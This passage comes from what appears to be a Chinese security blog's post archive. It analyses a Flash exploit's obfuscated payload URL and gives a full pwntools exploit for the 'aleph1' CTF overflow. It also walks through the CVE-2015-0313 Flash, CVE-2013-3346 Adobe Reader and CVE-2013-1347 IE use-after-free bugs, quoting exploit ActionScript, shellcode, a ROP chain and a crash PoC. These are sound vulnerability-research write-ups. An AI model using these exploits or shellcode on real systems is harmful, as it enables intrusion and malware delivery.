t_url[i] ^ 122;i++;&#125;t_url.uncompress(); 作者用perl，我们用python 12345678910import binasciiimport zlibhex_string = &quot;02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656&quot;binary_string = binascii.unhexlify(hex_string)# print binary_stringres = &quot;&quot;for i in binary_string: res += chr(ord(i) ^ 122)# print resprint zlib.decompress(res) 解码结果是这个，当然现在肯定访问不了，用作者的 1http://www.amcia.info/down/cd.txt 这个文件是加密了的 1234567891011121314151617if(!(browser.toLowerCase().indexOf(&quot;msie&quot;) &gt; 0 || browser.toLowerCase().indexOf(&quot;firefox&quot;) &gt; 0)) &#123; error_arr.uncompress(); &#125; if(browser.toLowerCase().indexOf(&quot;chrome&quot;) &gt; 0) &#123; error_arr.uncompress(); &#125; if(Capabilities.isDebugger || Capabilities.supports64BitProcesses || Capabilities.isEmbeddedInAcrobat) &#123; error_arr.uncompress(); &#125; var url_str:String = String(t_url); loader = new URLLoader(); loader.dataFormat = URLLoaderDataFormat.BINARY; loader.addEventListener(Event.COMPLETE,onLoadComplete); loader.load(new URLRequest(t_url.toString())); 给URLLoader的COMPLETE事件加了个onLoadComplete 123456789101112131415161718192021onLoadComplete = function(param1:Event):void &#123; content = loader.data; i = 0; while(i &lt; content.length) &#123; content[i] = content[i] ^ 122; i++; &#125; content.uncompress(); content_len = content.length; var _loc2_:ByteArray = new ByteArray(); code = _loc2_; _loc2_.position = 1024 * 1024; _loc2_.writeInt(2053274210); _loc2_.writeInt(2053339747); _loc2_.writeInt(2053405283); _loc2_.writeObject(_loc2_); test(); trace(_loc2_.length); &#125;; python解密 123456789import zlibfp = open(&quot;./cd.txt&quot;, &quot;rb&quot;)data = fp.read()dec = &quot;&quot;for i in data: dec += chr(ord(i) ^ 122)file = zlib.decompress(dec)fp2 = open(&quot;decode.bin&quot;, &quot;wb&quot;)fp2.write(file) 结果是一个加了壳的PE程序 金山火眼好像下架了，看看腾讯哈勃 https://habo.qq.com/file/showdetail?pk=AD0GZ11tB2YIMVs5 virustotal的 https://www.virustotal.com/#/file/021e3efdd7060cdbcbd066b5be3867de7b5ccc8ecbb8aa0cd2ad2971d9cc36f2/detection 行为挺多的，virustotal的也可以看到是游戏相关的木马 后面的看了下，比较懒。。。。。。，先不搞了 本地搭建服务器复现漏洞不错 将exp改为poc调试也是不错的操作 还有就是查看修补补丁的时候，没有match到函数，可以搜索漏洞的指令对应的16进制","categories":[],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://www.giantbranch.cn/tags/CVE/"},{"name":"数组越界","slug":"数组越界","permalink":"https://www.giantbranch.cn/tags/数组越界/"},{"name":"adobe","slug":"adobe","permalink":"https://www.giantbranch.cn/tags/adobe/"}]},{"title":"一道pwn题——aleph1","slug":"一道pwn题——aleph1","date":"2018-06-05T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/06/05/一道pwn题——aleph1/","link":"","permalink":"https://www.giantbranch.cn/2018/06/05/一道pwn题——aleph1/","excerpt":"","text":"这个是同事给的一个题目，据说是铁三的。一开始看了下没啥思路 main函数，其中_bss_start其实就是stdin，这明显存在缓冲区溢出 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; char yolo[1024]; // [rsp+0h] [rbp-400h] fgets(yolo, 1337, _bss_start); return 0;&#125; 看下导入表，基本就只有fgets了 我们再来看看保护措施，什么保护都没看，基本就是写shellcode执行了，但这个不太绝对，但是能有99%吧 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 搜了下，程序中没有jmp esp，call esp，这个路子断了，我们只能利用fgets，我们可能需要一些gadgets 问题是调用完fgets后，rdx的值变了，我们不能通过csu里面的通用gadget来重新调用fgets，因为我们不能正确地设置rdx的值 最后灵机一动，为何不用main函数原有的呢 12345.text:00000000004005D5 mov rdx, cs:__bss_start ; stream.text:00000000004005DC lea rax, [rbp+yolo].text:00000000004005E3 mov esi, 539h ; n.text:00000000004005E8 mov rdi, rax ; s.text:00000000004005EB call _fgets 我只要控制rbp的值就能控制写入的地址，那么最终的思路就是将第一次溢出控制rbp的值，跟着将shellcode写到bss段，再将控制权给到bss就可以了 123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-06-04 14:54:00# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.arch = &apos;amd64&apos;context.log_level = &quot;debug&quot;p = process(&quot;./aleph1&quot;)raw_input()shellcode = asm(shellcraft.sh())# 0x0000000000400538 : pop rbp ; retpop_rbp_ret = 0x400538mov_std = 0x4005d5bss_addr = 0x601038rbp_ctl = bss_addr + 0x400payload = &quot;A&quot; * 1032 + p64(pop_rbp_ret) + p64(rbp_ctl) + p64(mov_std) p.sendline(payload)raw_input(&quot;send second&quot;)payload2 = shellcode + &quot;\\x90&quot; * (1032 - len(shellcode)) + p64(bss_addr)p.sendline(payload2)p.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"https://www.giantbranch.cn/tags/缓冲区溢出/"}]},{"title":"CVE-2015-0313 Adobe Flash Player Workers ByteArray 释放重引用漏洞","slug":"CVE-2015-0313 Adobe Flash Player Workers ByteArray 释放重引用漏洞","date":"2018-05-30T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/05/30/CVE-2015-0313 Adobe Flash Player Workers ByteArray 释放重引用漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/05/30/CVE-2015-0313 Adobe Flash Player Workers ByteArray 释放重引用漏洞/","excerpt":"","text":"分析ActionScript虚拟机源码辅助漏洞调试原书ActionScript写错了 环境 win7 sp1 32位windbgida flash player下载地址 http://download.macromedia.com/pub/flashplayer/installers/archive/fp_16.0.0.296_archive.zip （建议使用vps下载，国内有可能被劫持） 历史版本页面 https://helpx.adobe.com/cn/flash-player/kb/archived-flash-player-versions.html 下载后安装的是flashplayer16_0r0_296_winax.msi，后来用exe还是不行【我分析个漏洞容易吗】，那我按照不带ax的flashplayer16_0r0_296_win.exe 不用ax的安装包也能崩溃，不过esi看不出是什么来 123456789101112131415161718192021222324252627282930313233343536373839404142434445(d18.908): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=05390000 ebx=0452ddc0 ecx=0452db84 edx=773e64f4 esi=05390000 edi=00000000eip=05390000 esp=0452dbd8 ebp=0452dc08 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0001020605390000 c3 ret0:005&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.0452dbd4 73bb20dd bd01f535 00000001 80004001 0x53900000452dc08 73bb2315 00000000 0452dc48 73bb3256 corpol!IsNxON+0x3b (FPO: [Non-Fpo])0452dc14 73bb3256 0452dc20 00000000 00000000 corpol!RbFreePermissionTreeData+0x10 (FPO: [Non-Fpo])0452dc48 73bb3589 0452dcc8 0452ddc0 0452dc74 corpol!GetActivePolicy+0x35f (FPO: [Non-Fpo])0452dd44 755f3660 0452ddc0 00000001 0452df18 corpol!CORPolicyProvider+0x2a1 (FPO: [Non-Fpo])0452de60 755f269e 00000000 00000000 00000000 wintrust!I_IsUnsignedPEFile+0x8d6 (FPO: [Non-Fpo])0452de7c 76f7adcc 00000000 0452df80 0452df18 wintrust!WinVerifyTrust+0x52 (FPO: [Non-Fpo])0452de94 76f7bd71 00000000 0452df80 0452df18 urlmon!Cwvt::WinVerifyTrust+0x1d (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\wvtp.h @ 58]0452dfa4 76f7c1cb 0000064c 00000000 00000002 urlmon!Cwvt::InvokeWinVerifyTrust+0x3cd (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\wvt.cxx @ 897]0452e394 76f8055e 0000064c 0019026a 05fb1f58 urlmon!Cwvt::VerifyTrust+0x110 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\wvt.cxx @ 495]0452fc48 76f774a5 76f775f2 0452fce8 00000000 urlmon!CDownload::VerifyTrust+0x172 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\dl.cxx @ 786]0452fc4c 76f775f2 0452fce8 00000000 00000113 urlmon!CCDLPacket::Process+0x68 (FPO: [0,0,0]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\packet.cxx @ 540]0452fc5c 76f7764c 03eb7fc0 00000000 0452fc98 urlmon!CCDLPacketMgr::TimeSlice+0x78 (FPO: [0,0,4]) (CONV: thiscall) [d:\\w7rtm\\inetcore\\urlmon\\download\\packet.cxx @ 331]0452fc6c 76e386ef 00000000 00000113 00007549 urlmon!CDL_PacketProcessProc+0x2c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\w7rtm\\inetcore\\urlmon\\download\\packet.cxx @ 58]0452fc98 76e39363 76f77620 00000000 00000113 USER32!InternalCallWinProc+0x230452fd10 76e38f6f 00000000 76f77620 00000000 USER32!UserCallWinProc+0xe0 (FPO: [Non-Fpo])0452fd68 76e38e9c 0452fd90 00000000 0452fdf0 USER32!DispatchMessageWorker+0x13d (FPO: [Non-Fpo])0452fd78 6ac604a6 0452fd90 00000000 0187cf58 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])0452fdf0 6ac70446 0585a808 00000000 032d6ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x452 (FPO: [Non-Fpo])0452fea8 75ef49bd 0187cf58 00000000 0452fec4 IEFRAME!LCIETab_ThreadProc+0x2c1 (FPO: [Non-Fpo])0452feb8 77541174 032d6ff0 0452ff04 773fb3f5 iertutil!CIsoScope::RegisterThread+0xab (FPO: [Non-Fpo])0452fec4 773fb3f5 032d6ff0 715e9a99 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])0452ff04 773fb3c8 75ef49af 032d6ff0 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])0452ff1c 00000000 75ef49af 032d6ff0 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])0:005&gt; ub 73bb20dd corpol!IsNxON+0x24:73bb20c6 ff156010bb73 call dword ptr [corpol!_imp__VirtualAlloc (73bb1060)]73bb20cc 8bf0 mov esi,eax73bb20ce 8975e4 mov dword ptr [ebp-1Ch],esi73bb20d1 3bf7 cmp esi,edi73bb20d3 7433 je corpol!IsNxON+0x66 (73bb2108)73bb20d5 c606c3 mov byte ptr [esi],0C3h73bb20d8 897dfc mov dword ptr [ebp-4],edi73bb20db ffd6 call esi0:005&gt; !heap -p -a esi 我们还是跟着作者的思路分析去 用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class Main extends Sprite &#123; private var ov:Vector.&lt;Object&gt;; private var uv:Vector.&lt;uint&gt;; private var ba:ByteArray; private var worker:Worker; private var mc:MessageChannel; private var b64:Base64Decoder; private var payload:String = &quot;&quot;; public function Main() &#123; ov = new Vector.&lt;Object&gt;(25600); uv = new Vector.&lt;uint&gt;(); ba = new ByteArray(); b64 = new Base64Decoder(); super(); if(Worker.current.isPrimordial) &#123; mainThread(); &#125; else &#123; workerThread(); &#125; &#125; private function mainThread() : void &#123; var _loc1_:* = 0; b64.decode(LoaderInfo(this.root.loaderInfo).parameters.sh); payload = b64.toByteArray().toString(); ba.length = 4096; ba.shareable = true; _loc1_ = uint(0); while(_loc1_ &lt; ov.length) &#123; ov[_loc1_] = new Vector.&lt;Object&gt;(1014); ov[_loc1_][0] = ba; ov[_loc1_][1] = this; _loc1_++; &#125; _loc1_ = uint(0); while(_loc1_ &lt; ov.length) &#123; delete ov[_loc1_]; _loc1_ = uint(_loc1_ + 2); &#125; worker = WorkerDomain.current.createWorker(this.loaderInfo.bytes); //创建后台worker mc = worker.createMessageChannel(Worker.current); mc.addEventListener(&quot;channelMessage&quot;,onMessage); //事件监听函数 worker.setSharedProperty(&quot;mc&quot;,mc); worker.setSharedProperty(&quot;ba&quot;,ba); ApplicationDomain.currentDomain.domainMemory = ba; //将ByteArrary对象设置为全局可用 worker.start(); &#125; worker进程 12345678910111213141516171819private function workerThread() : void &#123; var _loc3_:ByteArray = Worker.current.getSharedProperty(&quot;ba&quot;); //获得共享对象 var _loc2_:MessageChannel = Worker.current.getSharedProperty(&quot;mc&quot;); _loc3_.clear(); //释放 ov[0] = new Vector.&lt;uint&gt;(1022); _loc2_.send(&quot;&quot;); //发消息给主线程，促发onMessage函数 while(_loc2_.messageAvailable) &#123; &#125; ov[0][0] = ov[0][1027] - 24 - 4096; _loc3_.length = 5242880; var _loc1_:uint = vector_read(vector_read(ov[0][1032] - 1 + 64) + 8) + 1048576; var _loc5_:uint = ov[0][1033] - 1; var _loc4_:uint = vector_read(_loc5_); vector_write(vector_read(ov[0][1032] - 1 + 64) + 8); vector_write(vector_read(ov[0][1032] - 1 + 64) + 16,4294967295); _loc2_.send(ov[0][0].toString() + &quot;/&quot; + _loc1_.toString() + &quot;/&quot; + _loc5_.toString() + &quot;/&quot; + _loc4_.toString()); &#125; onMessage 123456789101112131415161718192021222324252627private function onMessage(param1:Event) : void &#123; var _loc7_:* = null; var _loc2_:* = 0; var _loc12_:* = 0; var _loc8_:* = 0; var _loc4_:* = 0; var _loc11_:* = 0; var _loc3_:* = 0; var _loc5_:* = 0; var _loc6_:* = 0; var _loc10_:* = 0; var _loc9_:* = 0; casi32(0,1022,4294967295); //这里是重引用，对domainMemory[0] if(ba.length != 4294967295) &#123; mc.receive(); &#125; else &#123; ba.endian = &quot;littleEndian&quot;; _loc7_ = (mc.receive() as String).split(&quot;/&quot;); byte_write(parseInt(_loc7_[0])); _loc2_ = uint(parseInt(_loc7_[1]) as uint); 。。。。。。 。。。。。。 。。。。。。 接下来简单看看AVM的源码：https://github.com/adobe-flash/avmplus Source Insight 打开后，搜索ByteArray 我们看看cpp，在左边函数窗口搜索clear即可定位到clear函数 123456789101112131415void ByteArray::Clear()&#123; if (m_subscribers.length() &gt; 0) &#123; AvmAssert(false); // shouldn&apos;t get here? m_toplevel-&gt;throwRangeError(kInvalidRangeError); &#125; if (IsShared()) &#123; ByteArrayClearTask task(this); task.run(); //核心点 &#125; else &#123; UnprotectedClear(); &#125;&#125; 这里调用的task.run，我们继续跟踪 1234567891011121314151617181920212223class ByteArrayClearTask: public ByteArrayTask &#123; public: ByteArrayClearTask(ByteArray* ba) : ByteArrayTask(ba) &#123; &#125; void run() &#123; // safepoints cannot survive exceptions TRY(m_core, kCatchAction_Rethrow) &#123; m_byteArray-&gt;UnprotectedClear(); //实际调用的是这里 &#125; CATCH(Exception* e) &#123; m_exception = e; &#125; END_CATCH; END_TRY; &#125; &#125;; 我们在函数列表搜一下 1234567891011121314151617181920 void ByteArray::UnprotectedClear() &#123; if (m_buffer-&gt;array &amp;&amp; !IsCopyOnWrite()) &#123; AvmAssert(m_buffer-&gt;capacity &gt; 0); // Note that TellGcXXX always expects capacity, not (logical) length. TellGcDeleteBufferMemory(m_buffer-&gt;array, m_buffer-&gt;capacity); mmfx_delete_array(m_buffer-&gt;array); &#125; m_buffer-&gt;array = NULL; m_buffer-&gt;capacity = 0; m_buffer-&gt;length = 0; // 3个清空的操作，假如再次使用那么就会崩溃了#if defined(VMCFG_TELEMETRY_SAMPLER) &amp;&amp; defined(DEBUGGER) if (m_gc-&gt;GetAttachedSampler()) &#123; ((IMemorySampler *)m_gc-&gt;GetAttachedSampler())-&gt;recordObjectReallocation(this); &#125;#endif m_copyOnWriteOwner = NULL; &#125; 其实后面作者就是通过查找到函数在ocx文件中的偏移，下对应的条件断点，可观察到从存在到被清空，到重引用的数据","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"uaf","slug":"uaf","permalink":"https://www.giantbranch.cn/tags/uaf/"}]},{"title":"CVE-2013-3346-Adobe Reader ToolButton 释放重引用漏洞","slug":"CVE-2013-3346-Adobe Reader ToolButton 释放重引用漏洞","date":"2018-05-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/05/29/CVE-2013-3346-Adobe Reader ToolButton 释放重引用漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/05/29/CVE-2013-3346-Adobe Reader ToolButton 释放重引用漏洞/","excerpt":"","text":"前言这是一个用于”Epic Turla”网络间谍攻击行动中的一个漏洞，PDF的漏洞 漏洞分析环境 win7 sp1 32位windbgidapeepdfadobe reader 11.0.00 ftp://ftp.adobe.com/pub/adobe/reader/win/11.x/11.0.00/zh_CN/AdbeRdr11000_zh_CN.exe 安装peepdf 1pip install peepdf -i开启交互模式 1peepdf -i ./msf.pdf 结果并不是很好使 我们直接复制下面 Q=开始的东西到一个文件里面 之后即可解密 12345678910111213141516PPDF&gt; js_jjdecode file jjencode.txtvar shellcode = unescape(&quot;%u00E8%u0000%u5D00%uED83%uE905%u008B%u0000%u5052%uD231%uC031%uF980%u7501%u6604%uEBAD%uAC01%u003C%u0D74%u613C%u0272%u202C%uCAC1%u010D%uEBC2%u39E3%u58DA%uC35A%u8956%uB2DA%u313C%u66C0%u028B%uD801%u508B%u0178%u52DA%u8B51%u184A%u428B%u0120%u8BD8%u0138%u53DF%u1E8B%uF787%u3151%uE8C9%uFFAE%uFFFF%u5B59%uF787%u0275%u08EB%uC083%u4904%u22E3%uDFEB%u428B%u2918%u89C8%u8BC1%u2442%uD801%u8B66%u480C%u428B%u011C%uC1D8%u02E1%uC801%u008B%uD801%u0689%u5A59%uC683%uE204%u5EAE%u31C3%u64D2%u528B%u8B30%u0C52%u528B%uB114%u8B01%u2872%u17BB%u2BCA%uE86E%uFF5A%uFFFF%u5A8B%u8B10%u7512%u31EC%uB1C9%u680E%uFA7C%u1596%uE668%u785C%u680F%u937D%uBDFA%u2068%uEA96%u6895%uBE1B%u1A09%uDA68%u7A8B%u68AE%u6CEF%uE688%u6868%u88F6%u680D%u4676%u8A8B%uCA68%u2A6A%u6895%u0B95%u1A7F%u4568%u9E3C%u6857%uBE1C%u302E%u4E68%uDFCC%u8912%uE8E6%uFF28%uFFFF%uBD8D%u040E%u0000%u0C6A%u8059%uC837%uE247%u6AFA%u686C%u746E%u6C64%uFF54%u1456%uF883%u0F00%uD484%u0001%u5600%uC931%u8941%u68C3%uFD91%u5947%uE689%uF3E8%uFFFE%u6AFF%u8901%u68E7%u2000%u0000%uE189%u406A%u0068%u1030%u5100%u006A%u6A57%uFFFF%u5916%u5E59%u835E%u00F8%u850F%u019B%u0000%u90B0%u89FC%uB9CF%u0EF5%u0000%uAAF3%uB956%u010B%u0000%uB58D%u0303%u0000%uA4F3%uFF5E%u1056%u0789%u858D%u040E%u0000%u006A%u006A%u036A%u006A%u006A%u006A%uFF50%u0C56%uF883%u0F00%u5C84%u0001%u8900%u6AC7%u6804%u1000%u0000%u0068%u0004%u6A00%uFF00%u0456%uF883%u0F00%u4084%u0001%uC700%u1440%u0125%u0703%u40C7%uAD1C%u0000%uC700%u2C40%u0020%u0000%u40C7%u0430%u0000%uC700%u3840%uBEEF%uDEAD%u006A%uE289%u006A%u6852%u0080%u0000%u6850%u0400%u0000%u6850%u23C8%u8FFF%uFF57%u0856%uDB31%u5255%uE789%u8352%u04C3%uC031%u5050%u5350%u56FF%u8334%uFFF8%uEF74%uC031%u5350%u56FF%u832C%uFFF8%uE374%u003D%u0010%u7C00%u89DC%u89C5%u31E0%u51C9%u6A50%u5704%uFF53%u3056%u3F81%u5025%u4644%uC575%uC483%u8908%u5DEF%uEF83%u6A04%u6804%u1000%u0000%u6A57%uFF00%u0456%uC931%u5150%u5754%u5350%u56FF%u5830%uF989%uD231%uFA80%u7401%u8111%uF238%u0909%u750A%u831E%u04C0%uC2FE%u8950%u57FB%u5256%u8950%u89C6%u29DA%u89FA%uF6D0%u28E2%u8006%uF336%u5A58%u405E%uE24F%u5FD1%u8158%uC8EC%u0000%u8900%u83E3%u0CEC%u5350%uC868%u0000%uFF00%u2456%u438D%u31FC%u89C9%u5308%u5051%uFF53%u2856%u43C7%u2FFC%u2063%uC720%uF843%u6D63%u2064%u8958%u31C5%u51C9%u6A51%u5102%u6851%u0000%u4000%uFF53%u0C56%uEB83%u5308%uC389%uC931%u8951%u51E0%u5750%u5355%u56FF%u531C%u56FF%u5820%u315B%u6AC0%u5300%u56FF%uFF18%u6016%u00E8%u0000%u5B00%uEB83%u8B06%u004D%u498B%u8104%u00E1%uFFF0%u66FF%u3981%u5A4D%u840F%u0093%u0000%uE981%u1000%u0000%uEDEB%u5052%uD231%uC031%uF980%u7501%u6604%uEBAD%uAC01%u003C%u0D74%u613C%u0272%u202C%uCAC1%u010D%uEBC2%u39E3%u58DA%uC35A%u8956%uB2DA%u313C%u66C0%u028B%uD801%u508B%u0178%u52DA%u8B51%u184A%u428B%u0120%u8BD8%u0138%u53DF%u1E8B%uF787%u3151%uE8C9%uFFAE%uFFFF%u5B59%uF787%u0275%u08EB%uC083%u4904%u22E3%uDFEB%u428B%u2918%u89C8%u8BC1%u2442%uD801%u8B66%u480C%u428B%u011C%uC1D8%u02E1%uC801%u008B%uD801%u0689%u5A59%uC683%uE204%u5EAE%u89C3%u89DD%u31CB%u41C9%u7468%uACC9%u894A%uE8E6%uFF88%uFFFF%u006A%uE789%u8B57%u0B85%u0001%u5000%u16FF%u835F%u00F8%u2675%u006A%uE089%u6A50%uFF04%u5E16%uF883%u7500%u8117%uC8C6%u0000%u8100%uC8C7%u0000%u8B00%u8906%uC707%u6C47%u0000%u0000%u6158%u01B8%u0001%uC200%u0004%u9494%u94E6%u8C86%uBA98%uB0A7%uC8B1&quot;);var executable = &quot;&quot;;var rop9 = &quot;&quot;;rop9 += unescape(&quot;%u313d%u4a82&quot;);rop9 += unescape(&quot;%ua713%u4a82&quot;);rop9 += unescape(&quot;%u1f90%u4a80&quot;);rop9 += unescape(&quot;%u9038%u4a84&quot;);rop9 += unescape(&quot;%u7e7d%u4a80&quot;);rop9 += unescape(&quot;%uffff%uffff&quot;);........................省略 那我们分析js，基本也能分析出个东西，除了对喷射，主要的代码就几条 12345678910111213141516app.addToolButton(&#123; cName: &quot;evil&quot;, cExec: &quot;1&quot;, cEnable: &quot;addButtonFunc();&quot;&#125;); // 创建evil Button并设置回调函数addButtonFuncaddButtonFunc = function() &#123; app.addToolButton(&#123;cName: &quot;xxx&quot;, cExec: &quot;1&quot;, cEnable: &quot;removeButtonFunc();&quot;&#125;);&#125; // 创建子Buton xxx，设置了回调函数removeButtonFuncremoveButtonFunc = function() &#123; app.removeToolButton(&#123;cName: &quot;evil&quot;&#125;); // 删除父对象，由于子对象还有父对象的引用，导致的uaf for (i=0;i &lt; 10;i++) arr[i] = part1.concat(part2);&#125; 调试我们调试看看，打开的时候最好把保护模式关掉（第一次开启的时候应该会问你），不然我也不知道行不行 12345678910111213141516171819202122232425262728(95c.eb0): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=0c0c08a8 ebx=00000001 ecx=0891fe18 edx=000011c4 esi=0891fe18 edi=00000000eip=4a82f129 esp=0023e51c ebp=0023e540 iopl=0 nv up ei pl nz ac po cycs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=002102134a82f129 ?? ???*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\AcroRd32.dll - 0:000&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.0023e518 6219e85d bb5ba807 00000001 0891fe18 0x4a82f1290023e540 6219e0d2 00000000 0891fe18 00000000 AcroRd32!DllCanUnloadNow+0x1505360023e564 6219f3e3 0023e5b8 6219d996 6219f409 AcroRd32!DllCanUnloadNow+0x14fdab0023e56c 6219d996 6219f409 08706f18 bb5ba8ff AcroRd32!DllCanUnloadNow+0x1510bc0023e5b8 6219c68c 00000000 bb5ba8af 08706f18 AcroRd32!DllCanUnloadNow+0x14f66f0023e5e8 6219c50e 086fabb8 04d6b090 bb5bab3f AcroRd32!DllCanUnloadNow+0x14e3650023e678 6219c206 08706f18 09729c48 0023e694 AcroRd32!DllCanUnloadNow+0x14e1e70023e688 6219c1a1 08706f18 0023e6c0 620f712e AcroRd32!DllCanUnloadNow+0x14dedf0023e694 620f712e 08706f18 04d6b090 bb5bab87 AcroRd32!DllCanUnloadNow+0x14de7a0023e6c0 6219ae0e 62b4cfb8 ffffffff 09729c30 AcroRd32!DllCanUnloadNow+0xa8e070023e6f0 62196d1d 00000001 0023e6c8 6219c193 AcroRd32!DllCanUnloadNow+0x14cae70023e714 62196bf1 000006c4 04d6b090 096ea780 AcroRd32!DllCanUnloadNow+0x1489f60023e72c 6219434c 04d6b090 bb5baa83 00000000 AcroRd32!DllCanUnloadNow+0x1488ca0023e7c4 6204e440 00000000 04d6b090 00000000 AcroRd32!DllCanUnloadNow+0x1460250023e7f0 62193a64 bb5ba55f 000006c4 086fabb8 AcroRd32!DllCanUnloadNow+0x1190023e818 625f38ef 087dbde8 00000000 086fabb8 AcroRd32!DllCanUnloadNow+0x14573d0023e894 625f3b7c 04e51dd0 00000001 086a2588 AcroRd32!CTJPEGRotateOptions::operator=+0xff7d3 我们看看前面调用的是什么，可以看劫持控制流的eax来源于esi 123456789100:000&gt; ub 6219e85d AcroRd32!DllCanUnloadNow+0x150518:6219e83f 897dfc mov dword ptr [ebp-4],edi6219e842 ff96d0020000 call dword ptr [esi+2D0h]6219e848 0fb7d8 movzx ebx,ax6219e84b 8b06 mov eax,dword ptr [esi]6219e84d 59 pop ecx6219e84e 8bce mov ecx,esi6219e850 66899ecc020000 mov word ptr [esi+2CCh],bx6219e857 ff9064030000 call dword ptr [eax+364h] 我们看看esi，这里由于堆喷已经占位了，所以是busy，这里也可以看到大小是0x370 123456789101112131415160:000&gt; !heap -p -a esi address 0891fe18 found in _HEAP @ 2570000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 0891fe10 0071 0000 [00] 0891fe18 00370 - (busy) 0:000&gt; dd esi0891fe18 0c0c08a8 41414141 41414141 414141410891fe28 41414141 41414141 41414141 414141410891fe38 41414141 41414141 41414141 414141410891fe48 41414141 41414141 41414141 414141410891fe58 41414141 41414141 41414141 414141410891fe68 41414141 41414141 41414141 414141410891fe78 41414141 41414141 41414141 414141410891fe88 41414141 41414141 41414141 41414141 懒得找纯正的poc了，不然更能精准看到是uaf","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"uaf","slug":"uaf","permalink":"https://www.giantbranch.cn/tags/uaf/"},{"name":"Adobe","slug":"Adobe","permalink":"https://www.giantbranch.cn/tags/Adobe/"}]},{"title":"CVE-2013-1347-Microsoft IE CGenericElement 释放重引用漏洞","slug":"CVE-2013-1347-Microsoft IE CGenericElement 释放重引用漏洞","date":"2018-05-28T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/05/28/CVE-2013-1347-Microsoft IE CGenericElement 释放重引用漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/05/28/CVE-2013-1347-Microsoft IE CGenericElement 释放重引用漏洞/","excerpt":"","text":"好久没分析漏洞了，《漏洞战争》这本书也停滞了很久了，最近没给自己什么任务，那就分析分析吧，虽然这个看着比较长，看看能不能简便一点。 “水坑”攻击事件就是黑客入侵了一个目标人群经常访问的网站，并植入攻击代码，成功借刀杀人哈哈 漏洞分析环境 win7 sp1 32位windbgida poc 12345678910111213141516171819202122232425262728293031&lt;!doctype html&gt; &lt;!-- required --&gt;&lt;HTML&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;ttttt:whatever id=&quot;myanim&quot;/&gt;&lt;!-- required format --&gt;&lt;script&gt; f0=document.createElement(&apos;span&apos;); document.body.appendChild(f0); f1=document.createElement(&apos;span&apos;); document.body.appendChild(f1); f2=document.createElement(&apos;span&apos;); document.body.appendChild(f2); document.body.contentEditable=&quot;true&quot;; f2.appendChild(document.createElement(&apos;datalist&apos;)); //has to be a data list f1.appendChild(document.createElement(&apos;table&apos;)); //has to be a table try&#123; f0.offsetParent=null; //required &#125;catch(e)&#123; &#125; f2.innerHTML=&quot;&quot;; //required f0.appendChild(document.createElement(&apos;hr&apos;)); //required f1.innerHTML=&quot;&quot;; //required CollectGarbage(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ie打开poc，windbg附加，允许阻止的内容 123456789101112131415161718192021220:013&gt; gModLoad: 69b60000 69c12000 C:\\Windows\\System32\\jscript.dll(e34.660): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=659d017a ebx=004bec08 ecx=0049c2e0 edx=00000000 esi=0268e8f0 edi=00000000eip=00000000 esp=0268e8c0 ebp=0268e8dc iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0001024600000000 ?? ???0:005&gt; kvChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong.0268e8bc 65b8c407 65bb5961 0268ec0c 004bec08 0x00268e8c0 65bb5961 0268ec0c 004bec08 00000000 mshtml!CElement::Doc+0x7 (FPO: [0,0,0])0268e8dc 65bb586d 004bec08 0268ec0c 004bec08 mshtml!CTreeNode::ComputeFormats+0xba0268eb88 65bba12d 004bec08 